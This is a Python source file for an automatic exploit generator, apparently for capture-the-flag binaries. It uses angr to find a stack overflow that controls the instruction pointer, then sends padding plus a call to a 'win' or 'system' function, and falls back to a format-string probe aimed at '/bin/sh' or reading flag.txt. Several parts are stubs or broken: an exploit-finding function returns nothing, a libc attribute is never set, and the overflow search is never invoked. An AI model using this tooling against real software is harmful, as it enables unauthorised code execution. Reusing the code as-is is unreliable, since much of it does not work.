import angr
import claripy
import os
import logging
import argparse

from pwn import *

logging.getLogger('angr').setLevel(logging.WARNING)
logging.getLogger('os').setLevel(logging.WARNING)

context.update(
    arch="amd64",
    endian="little",
    log_level="debug",
    os="linux",
    terminal=["tmux", "split-window", "-h", "-p 65"]
)


class rAEG:

    strings =  ['/bin/sh', '/bin/cat flag.txt', 'flag.txt']
    exploit_functions = ['win', 'system', 'execve', 'syscall']

    def __init__(self, binary_path):
        self.binary = binary_path
        self.elf = context.binary =  ELF(binary_path)
        #self.libc = context.binary = ELF(libc_path)

        self.gadget_function = None
        self.parameters = []
        self.string_address = None

        # Create angr project
        self.proj = angr.Project(binary_path, load_options={'auto_load_libs':False})
        start_addr = self.elf.sym['main']
        # Maybe change to symbolic file stream
        self.symbolic_input = claripy.BVS("input", 8 * 600)
        self.symbolic_padding = None

        self.state = self.proj.factory.blank_state(
                addr=start_addr,
                stdin=self.symbolic_input
        )
        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
        self.simgr.stashes['mem_corrupt'] = []

    # Function to check if there is a memory corruption which can lead to the instruction pointer being overwritten
    def check_mem_corruption(self, simgr):
        if len(simgr.unconstrained) > 0:
            for path in simgr.unconstrained:
                if path.satisfiable(extra_constraints=[path.regs.pc == b"CCCCCCCC"]):
                    path.add_constraints(path.regs.pc == b"CCCCCCCC")

                    if path.satisfiable():
                        simgr.stashes['mem_corrupt'].append(path)
                        stack_smash = path.solver.eval(self.symbolic_input, cast_to=bytes)
                        index = stack_smash.index(b'CCCCCCCC')
                        self.symbolic_padding = stack_smash[:index]
                        log.info("[+] Found symbolic padding: {}".format(self.symbolic_padding))
                        log.info("[+] Takes {} bytes to smash the instruction pointer".format(len(self.symbolic_padding)))
                    simgr.stashes['unconstrained'].remove(path)
                    simgr.drop(stash='active')

        return simgr

    # Use angr to explore with the check_mem_corruption function
    def stack_smash(self):
        log.info("[+] Smashing the stack")
        self.simgr.explore(step_func=self.check_mem_corruption)

        if len(self.simgr.stashes['mem_corrupt']) <= 0:
            log.info("[-] Failed to smash stack")


        return self.symbolic_padding


    # Determine which exploit we need and return which type as a string
    # Also determine the parameters needed, and the function to execute``
    def find_exploit(self):
        return None

    def generate_rop_chain_call(self):

        chain = b''
        # If it is a syscall add pop rax, 59 for execve
        #if self.gadget_function == "syscall":
            # Get pop rax gadget or another gadget to control rax
            #break
        regs = ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9']
        #for i in range(len(self.parameters)):

        chain += p64(self.elf.sym[self.gadget_function])

        return chain

    def start_process(self, mode):

        gs = '''
            init-pwndbg
        '''

        if mode == "GDB":
            return gdb.debug(self.binary, gdbscript=gs)
        elif mode == "REMOTE":
            return remote()
        else:
            return process(self.binary)

    def resolve_libc_base(self, leak):
        # Get libc base from debugger/angr

        self.libc.address

        return None

    def exploit(self):


        p = self.start_process(None)
        if self.symbolic_padding != None:
            # Check if regular rop chain or libc leak
            # If there is a leak given then parse the leak
            #
            chain = self.generate_rop_chain_call()
            p.sendline(self.symbolic_padding + chain)
            p.interactive()
        # Assume that its a format challenge either format write or format leak
        else:
            p.sendline("%p")
            p.interactive()
        
        return None

if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        prog = "RageAgainstTheMachine",
        description = "An automatic exploit generator using angr, ROPgadget, and pwntools",
        epilog = "Created by Stephen Brustowicz, Alex Schmith, Chandler Hake, and Matthew Brown"
    )
    parser.add_argument("bin", help="path of binary to exploit")
    #parser.add_argument("libc", help="path of libc shared object")
    args = parser.parse_args()

    rage = rAEG(args.bin)
    rage.exploit()
